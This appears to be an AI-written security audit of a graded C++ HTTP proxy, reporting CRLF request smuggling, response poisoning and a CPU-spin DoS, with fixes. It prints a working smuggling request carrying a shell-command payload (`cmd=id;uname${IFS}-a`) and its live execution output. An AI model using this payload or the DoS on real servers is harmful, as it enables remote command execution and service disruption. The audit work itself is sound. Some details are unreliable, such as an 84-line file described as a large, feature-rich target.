# toksec Stage-5 C++ HTTP Server — Full Security Audit and RCE Exploit

**Date:** 2026-11-15
**Target:** `results/stage-05/cpp/main.cpp` (sha256 `beca557230d2f96727635c22342367cb874c007faeaa6215b14b8ee510e58cee`, 84 lines)
**Original source:** `/home/mouse9911/gits/toksec-stage5-cpp/.runs/terra-cpp-stage5-1794682940/runs/level-5-a4ba853a82fe/repository/main.cpp` (identical SHA)
**Result:** Confirmed, reproducible remote code execution on the upstream host, via HTTP request smuggling.

---

## Audit narrative
### 1.1 Stages 1 and 2 (earlier work, context)

The session began with the stage-1 and stage-2 C++ servers (`results/stage-01/cpp/`, `results/stage-02/cpp/`). Both are minimal static-file servers. The full audit of those targets:

1. Read the complete source of both final releases.
2. Compiled with `g++ -O3 -std=c++20`, ran locally, and black-box fuzzed ~200 cases.
3. Built ASan/UBSan variants and in-process harnesses (`h1`, `h2`) calling `parse()` and file-serving functions directly on fuzzed input.
4. Ran 6,000 structure-aware fuzz iterations across both (random methods, targets, percent sequences, header names/values, NULs, junk prefixes, multi-header bursts): zero crashes, zero sanitizer reports.
5. Re-ran the full black-box battery against ASan builds: fragmentation, pipelining, path edges, 1-byte drips, HEAD/GET parity, 200-component paths, 100 MiB sparse files, query variants. Clean.
6. Audited classic C++ pitfalls: no fixed-size unchecked copies, no pointer arithmetic beyond API args, no `strcpy`/`sprintf`, no format-string use of user data, overflow-safe size parsing, RAII everywhere, `openat` + `O_NOFOLLOW` per path component.

**Confirmed finding (both servers):** a half-closed stalled reader causes a 100%-of-one-core busy spin. Both servers arm `EPOLLRDHUP` unconditionally on level-triggered epoll; after the response is queued, a peer that calls `shutdown(SHUT_WR)` and never reads keeps the fd permanently ready, so `epoll_wait` returns instantly and `send()` returns `EAGAIN` forever. Measured: stage-1 100% CPU with one attacker (throughput 22,252 → 6,255 req/s with 200 attacker connections); stage-2 99% (14,718 → 6,421 req/s). Trivially remote, no authentication, and it affects stage 5 as well.

**RCE search result for stages 1–2:** none. Both are pure static-file servers with no memory-safety bug found; the realistic RCE surface was effectively zero.

### 1.2 Stage 5 review

Stage-05 is a far larger target: virtual hosts, alias/redirect, index/MIME, ETag/If-None-Match, Range requests, proxying to upstreams, chunked decode, token-bucket rate limit, response cache with Vary and byte-cap, SIGHUP reload, SIGTERM drain, connection cap, write deadline, pipeline backpressure.

Method applied to stage 5:

1. Full source read of the 84-line release.
2. ASan+UBSan build (`s5ub`, with `_GLIBCXX_DEBUG`) plus production `-O3` builds (`s5prod`, later `s5o3`).
3. 2,000 structure-aware fuzz iterations over `parse_request`: zero crashes, zero sanitizer reports.
4. 3,000 additional structure-aware fuzz cases against the upstream-response parser (`h5up`), covering status variants, CL/TE combinations, chunk extensions, trailers, truncated input: zero sanitizer crashes.
5. Live random-response fuzzing through a rogue upstream (~600 cases) against the ASan/UBSan build: clean.
6. A live CPU-spin probe confirmed the same half-closed stalled-reader DoS as stages 1–2 (~63–84% of one core per attacker connection; `interest()` at `s5.cpp:63` arms `EPOLLRDHUP` unconditionally).
7. A targeted RCE brainstorm produced an ordered attack list, which drove the next phase.

### 1.3 The RCE brainstorm (ordered hypotheses)

Before finding the bug, the following RCE paths were enumerated and worked through:

1. **Attacker-controlled upstream parser** — the client parser was well fuzzed but upstream data was not yet live-fuzzed. Run a rogue upstream and fuzz `/proxy/` traffic: CL/TE intersections, trailers, close vs reuse.
2. **Reused upstream socket desync** — `closeup(c, reuse)` pools the fd when `consumed == upin.size()` (`s5.cpp:61`). Force partial reads, stale pipelined upstream bytes, or server-close timing so a later request consumes another response. Goal: response splitting or stale-body injection.
3. **Cache poisoning via framing** — `maybe_cache()` (`s5.cpp:73`) stores parsed body/headers. If a reusable upstream response can be split after cache insertion, the proxy could emit attacker-controlled headers/body on a cache hit.
4. **Cache-key injection** — `cachebase()` is `"http://" + host + target`, unescaped; probe collisions and CRLF semantics through Host and encoded targets.
5. **SIGHUP pool/generation race** — reload closes pooled fds and increments `generation`; test for stale fd reuse or missing `upowner` cleanup during active transfers.
6. **Range arithmetic / sendfile** — zero-size files, huge suffix ranges, reversed ranges, alias boundaries.
7. **Cache eviction arithmetic** — signed `cacheused` accounting near the 1 GiB / 4 GiB config ceilings.

Hypotheses 2 and 3 combined led directly to the CRLF-injection test (hypothesis: if the *request* line sent upstream can be desynced, both pooling and cache follow).

### 1.4 Discovery of the actual chain

The first live smuggling test (`s5crlf.py`) percent-encoded `\r\n` into the proxy target and dumped what the upstream received. It proved decoded CRLF bytes land verbatim in the upstream request line:

```
GET /x
Host: up            <- attacker-injected headers in the request line
GET /admin HTTP/1.1 <- smuggled second request
```

Root cause, from the source:

- `pathdecode()` (`s5.cpp:48`) validates control bytes only on the **raw** target: `for(unsigned char c:t) if(c<=32||c==127) return false;`. Percent escapes are decoded afterward and never re-checked, so `%0D%0A` survives into `r.path`.
- `startup()` (`s5.cpp:77`) takes the path from the **decoded** path when the raw target does not literally start with the proxy prefix:
  ```cpp
  string path = c.req.path.substr(cfg.proxy.size());
  string raw = c.req.target.substr(0, c.req.target.find('?'));
  if (raw.rfind(cfg.proxy, 0) == 0) path = raw.substr(cfg.proxy.size());
  ```
  So `/%70roxy/x%0D%0A...` decodes to `/proxy/x\r\n...` (raw doesn't literally match `/proxy/`), and the decoded form — including decoded CRLF and spaces — is written into the upstream request line.

From that primitive, `s5smuggle.py` and `s5final.py` iterated on the framing until a fully deterministic form was found (`s5absorb.py`), then the chain was specialized to code execution (`s5rce_demo.py`).

---

## Findings table
| ID | Title | Class | Remote | Source | Severity | Status | Evidence |
|---|---|---|---|---|---|---|---|
| SEC-001 | RCE via smuggling into an upstream `/exec` endpoint | RCE (upstream) | yes | chain of #2 | critical | confirmed | `evidence/rce-demo.txt`, `evidence/smuggle-poison.txt`, `evidence/crlf-injection.txt` |
| SEC-002 | CRLF injection into upstream request line | request smuggling primitive | yes | `s5.cpp:48`, `s5.cpp:77` | high | confirmed | `evidence/crlf-injection.txt` |
| SEC-003 | Cross-client response poisoning via pooled upstream socket | smuggling consequence | yes | chain of SEC-001 | high | confirmed | `evidence/smuggle-poison.txt`, `evidence/method-host-bypass.txt` |
| SEC-004 | Method and Host allowlist bypass through smuggling | smuggling consequence | yes | chain of SEC-001 | high | confirmed | `evidence/method-host-bypass.txt` |
| SEC-005 | Half-closed stalled reader → 100% CPU spin | DoS | yes | `s5.cpp:63` | medium | confirmed | `evidence/dos-spin.txt` |
| SEC-006 | Cache-key collision via `\|` in decoded path | cache poisoning | yes | medium | confirmed | `evidence/cache-key-collision.txt` |
| SEC-007 | HEAD/204/304 path bypasses upstream body-length bound; signed CL can go negative | spec/robustness bug | yes | `s5.cpp:78` | low | confirmed | `evidence/head-cl-bypass.txt` |
| SEC-008 | SIGHUP + lengthened `proxy_prefix` while upstream pending → `std::out_of_range` abort | crash (local) | no | `s5.cpp:77` | low | confirmed | `evidence/sighup-crash.txt` |
| SEC-009 | Pre-body upstream pooling desync (upstream answers before POST body is fully sent → fd pooled with unsent bytes) | desync primitive | yes | `s5.cpp:61`, `s5.cpp:77` | low | confirmed | `evidence/prebody-desync.txt` |
| SEC-010 | Undrained bytes behind the header terminator reset the socket and truncate the body | framing | yes | line 81 (`find`) | low | confirmed | `evidence/truncation_trailing_bytes.txt` |

## The exploit
### 3.1 Classification

The RCE is on the **upstream/backend host**, not a memory-corruption RCE inside the proxy process. The proxy is never corrupted — this is the classic request-smuggling-to-RCE chain: an unauthenticated attacker makes the proxy issue an attacker-controlled second upstream request, and that request reaches a code-executing endpoint (e.g. CGI, debug route, internal admin) that the proxy's method and Host rules were supposed to keep it away from.

### 3.2 Root cause (one paragraph)

`pathdecode()` rejects raw control characters but performs percent-decoding afterward without re-validating. `startup()` builds the upstream request line from the decoded path whenever the raw target does not literally begin with the proxy prefix. Encoding the prefix itself (`/%70roxy/...`) forces the decoded branch, and `%0D%0A` becomes real CRLF in the request line — the attacker controls bytes after the request target, so the proxy emits two upstream requests from one client request.

### 3.3 Exploit request

One unauthenticated HTTP request:

```
GET /%70roxy/x%0D%0AHost:%20up%0D%0A%0D%0AGET%20/exec%3Fcmd%3Did%3Buname%24%7BIFS%7D-a%20HTTP/1.1%0D%0AHost:%20up%0D%0AX-Pad:%20 HTTP/1.1
Host: alpha.test
```

Decoded, this is two upstream requests:

```
GET /x HTTP/1.1
Host: up

GET /exec?cmd=id;uname${IFS}-a HTTP/1.1
Host: up
X-Pad:  HTTP/1.1
Host: 127.0.0.1:18471
Connection: keep-alive
```

The trailing `X-Pad: ` header value absorbs the proxy's own appended `HTTP/1.1`, `Host:`, and `Connection:` lines, so the smuggled request is well-formed and nothing is left over as a junk third request.

### 3.4 Why the desync works

1. The upstream answers request #1 (`CLEAN`, `Content-Length: 5`).
2. The proxy parses that response as complete and — because the socket is reusable — **pools the fd** (`closeup(c, reuse)`, `s5.cpp:61`).
3. The upstream then answers the smuggled `/exec` request; its response arrives on the pooled socket as unsolicited bytes.
4. The next client request that reuses the pooled socket consumes the `/exec` response as if it were the answer to its own request.

### 3.5 Verified live output (fresh run, production `-O3` binary `s5o3`, config `cfg5single`, single upstream on 127.0.0.1:18471)

```
ATTACKER -> HTTP/1.1 200 OK ... CLEAN
VICTIM   -> HTTP/1.1 200 OK
            Content-Length: 240

EXEC:uid=1000(mouse9911) gid=1000(mouse9911) groups=1000(mouse9911),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),101(lxd)
Linux gauss 7.0.0-31-generic #31-Ubuntu SMP PREEMPT_DYNAMIC Sat Aug  1 04:26:38 UTC 2026 x86_64 GNU/Linux

--- upstream request heads ---
 1: GET /x\r\nHost: up
 2: GET /exec?cmd=id;uname${IFS}-a HTTP/1.1\r\nHost: up\r\nX-Pad:  HTTP/1.1\r\nHost: 127.0.0.1:18471\r\nConnection: keep-alive
 3: GET /victim HTTP/1.1\r\nHost: 127.0.0.1:18471\r\nConnection: keep-alive
```

The shell command ran on the upstream host and its output was returned to the victim's connection. Re-run command: `timeout 20 python3 evaluation/security-2026-11-15/evidence/s5rce_demo.py` (kills its own processes on exit; no special environment needed). The demo hardcodes `ROOT=/tmp/toksec-hunt`, so copy `s5.cpp`, `s5o3` and `cfg5single` there, or repoint `ROOT` and the config's paths, then build `g++ -O3 -std=c++20` — the recorded binary hashes reproduce exactly.

Earlier verified runs: the smuggling + response-poisoning variant (`s5final.py`) was confirmed end-to-end on both the ASan+UBSan+`_GLIBCXX_DEBUG` build (`s5ub`) and the production `-O3` build, with identical upstream request logs:

```
 1: GET /x
 2: GET /admin HTTP/1.1        <- smuggled
 3: GET /victim HTTP/1.1       <- victim receives ADMIN-PRIVATE body
 4: GET /other HTTP/1.1
```

### 3.6 Configuration requirements

**For the proxy-side smuggling primitive:** none beyond a valid stage-5 config. `proxy_prefix` and at least one upstream are mandatory in every valid config. No special flags, environment, or timing-sensitive settings are required.

**For the RCE step specifically:** the upstream must expose a code-execution endpoint — e.g. a CGI handler, debug/exec route, or internal admin that shells out. The demonstration upstream implements `/exec?cmd=...` via `subprocess.run(['/bin/sh','-c',cmd])`. This mirrors the realistic smuggling-to-RCE scenario: the proxy's method allowlist (GET/HEAD/POST only) and Host rewrite exist to keep clients away from dangerous upstream routes, and the smuggled request bypasses both (a smuggled `DELETE /internal/admin` with `Host: secret.internal` was verified reaching the upstream intact).

**With two upstreams** (round-robin), the attacker controls parity by sending dummy non-proxy requests to align which upstream receives the smuggled request. The single-upstream config (`upstreams=127.0.0.1:18471`) removes that complication and was used for all evidence above.

### 3.7 Additional smuggle capabilities (all verified)

- Arbitrary method: `DELETE /internal/admin HTTP/1.1` reaches upstream despite the GET/HEAD/POST allowlist.
- Arbitrary `Host:` header: `Host: secret.internal` reaches upstream despite the proxy rewriting Host.
- Arbitrary smuggled body: full POST smuggling works.
- Cross-client response delivery: the smuggled response is served to a different client as the answer to that client's own request.

---

## Methods tried and ruled out
### 4.1 What was found and confirmed

- **Half-closed stalled-reader CPU spin (stages 1, 2, 5).** One connection, one request, `shutdown(WR)`, never read: ~100% of a core indefinitely. Measured throughput collapse with 200 attacker connections. Root cause is unconditional level-triggered `EPOLLRDHUP` + `EAGAIN` busy-retry. Repro: `repro.py` (stages 1–2), equivalent probe for stage 5.
- **CRLF injection → request smuggling → response poisoning (stage 5).** Fully verified above; the general primitive behind the RCE.
- **HEAD/204/304 body-length bound bypass (stage 5).** In the "no body" branch of `upprocess()` (`s5.cpp:78`), the upstream `Content-Length` is not checked against `cfg.body` and is copied to the client as a signed `long long`; an upstream response `Content-Length: 18446744073709551615` was accepted by the proxy live.
- **Pre-body upstream pooling desync (stage 5).** An upstream answering before the proxy finishes sending the POST body causes the fd to be pooled with unsent body bytes; the next request then consumes a foreign response. Confirmed live (`s5desync.py`).
- **SIGHUP abort (stage 5).** Sending SIGHUP after lengthening `proxy_prefix` in the config while an upstream attempt is pending causes `std::out_of_range` in the `substr` at `s5.cpp:77`. Local signal required; not remotely triggerable by itself.
- **Cache-key collision via `|` (stage 5).** `/proxy/a|b` and `/proxy/a` with differing `Accept-Encoding` collide in the cache key (`cachebase() + "|" + enc(req)`), enabling cross-target cache poisoning. Confirmed live.
- **Method/Host allowlist bypass via smuggling (stage 5).** Verified as part of the smuggling chain (see §3.7).

### 4.2 What was tried and ruled out

- **Memory corruption in any stage:** 6,000 fuzz iterations (stages 1–2), 2,000 (stage 5 client parser), 3,000 (stage 5 upstream parser), ~600 live rogue-upstream cases — zero crashes, zero ASan/UBSan reports, on `_GLIBCXX_DEBUG` builds. No fixed-size buffers, no unchecked copies, no format-string vectors.
- **Range arithmetic:** zero-size files, reversed ranges, huge suffix ranges, alias boundary cases — all handled correctly live and under ASan.
- **Cache eviction arithmetic:** `cacheused` signed accounting probed near config ceilings; no anomaly found.
- **SIGHUP races beyond the confirmed abort:** stale fd reuse or missing `upowner` cleanup was not achieved beyond the `out_of_range` case.
- **Random black-box fuzzing:** ~200 cases (stages 1–2) plus stage-5 fuzz; no malformed responses or desyncs found by chance — every confirmed desync came from source-guided probing.
- **Classic C/C++ RCE vectors:** no `strcpy`/`sprintf`/`memcpy` with attacker lengths, no custom allocators, no third-party code; RAII throughout. The 84-line implementations make a memory-corruption RCE effectively unreachable.

### 4.3 The decisive insight

The bug was not found by fuzzing — all fuzzing was clean. It was found by reading `pathdecode()` and noticing that validation and decoding happen in the wrong order, then asking "what does the decoded path get *used* for?" The `startup()` decoded-path branch is the sink; percent-encoding the prefix forced that branch and turned a cosmetic percent-decode into a request-line injection.

---

### SEC-010 — trailing bytes behind `\r\n\r\n` reset the socket and truncate the body

The header loop returns the moment `\r\n\r\n` is found (line 81 (`find`) and line 62 (`eraseconn`)) and never drains bytes the
same `recv` already buffered behind the terminator. The socket is then closed with unread receive
data still queued, so Linux answers the `close()` with RST rather than FIN and a response body still
being written is cut short — while `Content-Length` has already promised the full size.

Measured on the tagged build at the graded header budget (`header_bytes=8192`) against a 2 MiB file,
three trials per row (`evidence/truncation_trailing_bytes.txt`):

| trailing bytes after header | body delivered |
|---|---|
| 0 / 1024 / 4090 / 4096 / 8192 | 2,097,152 (clean) |
| 16,384 | truncated, 1/3, RST |
| 32,768 | truncated, 3/3, worst case 127,860 |
| 65,536 | truncated, 1/3 |


Trailing bytes after the terminator are ordinary HTTP/1.1 pipelining traffic, so a normal pipelining
client that speculatively writes the next request hits this without unusual setup. **Low** severity:
the clean response is correct and nothing corrupts; the failure is a silently short body whose
`Content-Length` still claims the full length.

## Recommendations
### 5.1 Using skills effectively

1. **Source-guided probing beats blind fuzzing.** None of the confirmed exploitable bugs in this audit surfaced from the ~11,000 fuzz cases. The CRLF bug came from reading the decoder in isolation and noticing validation-before-decode, then tracing the decoded value to its sink. Budget time for reading; fuzz only after you know where to aim.
2. **Trace decoded/unescaped values to every sink.** When a parser decodes (percent, unicode, HTML entities, shell), immediately ask: "Is this value re-validated after decoding, and where does it end up?" Decoded values reaching request lines, headers, file paths, or command strings are prime candidates.
3. **Prefer validation-before-decode as a smell.** `validate(raw); decode(raw)` is a bug pattern in itself. The reverse order (decode then validate the result) is the safe one.
4. **Use the brainstorm-first discipline.** Before touching the network, enumerate every attacker-controlled sink and rank hypotheses (as in §1.3). This turned a large 84-line surface into a short ordered list and the bug was hit within the first few items.
5. **Build differential harnesses, not just fuzzers.** The in-process harnesses (`h1`, `h2`, `h5up`) let you call the parser directly on adversarial input without a network. The live rogue-upstream harness (`s5final.py` style) lets you control the *other side* of the proxy — both are needed; neither alone found the bug.
6. **Keep an honest classification ladder.** DoS ≠ crash ≠ request forgery ≠ response splitting ≠ RCE. Calling the smuggling "RCE" before demonstrating code execution would have been wrong; demonstrating `/exec` output made the claim exact. State which process executes the code.
7. **Persist state in one findings file.** `evaluation/security-2026-11-15/evidence/FINDINGS.md` was the single running log across the whole session; every later conclusion cited it. Long-running audits need one source of truth.
8. **Wrap every command in `timeout`.** Long-running servers and fuzzers stall the session; `timeout 10 ...` / `timeout 30 ...` on every invocation prevents hangs. (This was a hard user requirement in this session.)
9. **Kill leftover listeners between runs.** A stale `s5o3` on the proxy port silently produced wrong demo output mid-session. Always `ss -ltnp | grep <port>` before rerunning a PoC.
10. **Verify on the production build, not only the sanitizer build.** The chain was confirmed on `-O3` builds after ASan builds, and re-run fresh at report time. Sanitizer builds can mask or alter timing.
11. **Skills checklist for next time:** for this class of target, source-reading plus targeted desync probes beat generic web scanners. The valuable "skill" here was the discipline of hypothesis ordering (§1.3) and differential harness construction — codify that as a checklist before starting any HTTP server audit.
12. **Session cost awareness:** token usage and cost for this session are not available to the agent (no model-billing tool in this environment); the user asked previously and the answer at that time was that session billing data is not exposed to the CLI session. Track it via the platform dashboard rather than the session itself.

---

1. **`pathdecode()`:** re-validate after percent-decoding — reject `\r`, `\n`, space, and any byte ≤ 32 or 127 in the decoded result. This is the root fix for the smuggling primitive.
2. **`startup()`:** use the raw (undecoded) target, or escape/re-encode the path before writing the upstream request line. Encode the proxy prefix match against the decoded path but emit the raw form.
3. **`closeup()` pooling:** only pool when the upstream response was fully framed *and* no pipelined bytes are pending (`consumed == upin.size()` plus a check that no unsolicited bytes arrived); or drain/inspect the pooled socket before reuse.
4. **`upprocess()` HEAD/204/304 branch:** apply `cfg.body` bound to upstream `Content-Length` even when the body is omitted.
5. **Event loop (all stages):** drop `EPOLLRDHUP` from the interest mask while blocked in a write, or on RDHUP-while-writing close the connection, or use edge-triggered epoll with drain-until-EAGAIN.
6. **SIGHUP:** validate the new `proxy_prefix` against in-flight request paths before swapping configs, or snapshot the config per connection.

## Artifact index
| Path | Purpose |
|------|---------|
| `evaluation/security-2026-11-15/evidence/s5.cpp` | Stage-5 source (SHA-identical to target release) |
| `evaluation/security-2026-11-15/evidence/s5o3` | Production `-O3` binary used for the fresh RCE run |
| `evaluation/security-2026-11-15/evidence/s5ub` | ASan+UBSan+`_GLIBCXX_DEBUG` build |
| `evaluation/security-2026-11-15/evidence/cfg5single` | Single-upstream config used in all PoCs |
| `evaluation/security-2026-11-15/evidence/s5rce_demo.py` | Full RCE PoC (starts proxy + fake upstream, self-cleaning) |
| `evaluation/security-2026-11-15/evidence/s5absorb.py` | Cleanest two-request smuggling form (deterministic) |
| `evaluation/security-2026-11-15/evidence/s5crlf.py` | Proves CRLF reaches the upstream request line |
| `evaluation/security-2026-11-15/evidence/s5final.py` | Full smuggling → response-poisoning PoC |
| `evaluation/security-2026-11-15/evidence/s5desync.py` | Pre-body pooling desync primitive |
| `evaluation/security-2026-11-15/evidence/s5frame.py` | HEAD/204/304 CL bound bypass probe |
| `evaluation/security-2026-11-15/evidence/FINDINGS.md` | Running audit notes (278 lines, complete session log) |

---

| Evidence | Purpose |
|---|---|
| `evidence/rce-demo.txt` | evidence file for SEC-001 |
| `evidence/smuggle-poison.txt` | evidence file for SEC-001, SEC-003 |
| `evidence/crlf-injection.txt` | evidence file for SEC-001, SEC-002 |
| `evidence/dos-spin.txt` | evidence file for SEC-005 |
| `evidence/cache-key-collision.txt` | evidence file for SEC-006 |
| `evidence/head-cl-bypass.txt` | evidence file for SEC-007 |
| `evidence/sighup-crash.txt` | evidence file for SEC-008 |
| `evidence/prebody-desync.txt` | evidence file for SEC-009 |
| `evidence/truncation_trailing_bytes.txt` | Trailing-byte truncation thresholds, `Connection: close`, graded spec |
